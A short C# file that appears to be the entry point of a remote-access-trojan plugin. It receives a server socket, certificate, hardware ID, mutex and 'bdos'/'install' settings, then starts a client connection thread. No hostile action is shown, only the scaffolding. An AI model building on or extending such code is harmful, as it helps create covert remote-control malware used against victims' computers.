using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;

namespace Plugin
{
   public class Plugin
    {
        public static Socket Socket;
        public static Mutex AppMutex;
        public static string Mutex;
        public static string BDOS;
        public static string Install;
        public static string InstallFile;

        public void Run(Socket socket, X509Certificate2 certificate, string hwid, byte[] msgPack, Mutex mutex, string mtx, string bdos, string install)
        {
            Debug.WriteLine("Plugin Invoked");
            AppMutex = mutex;
            Mutex = mtx;
            BDOS = bdos;
            Install = install;
            Socket = socket;
            Connection.ServerCertificate = certificate;
            Connection.Hwid = hwid;
            new Thread(() =>
            {
                Connection.InitializeClient(msgPack);
            }).Start();

            while (Connection.IsConnected)
            {
                Thread.Sleep(1000);
            }
        }
    }
}
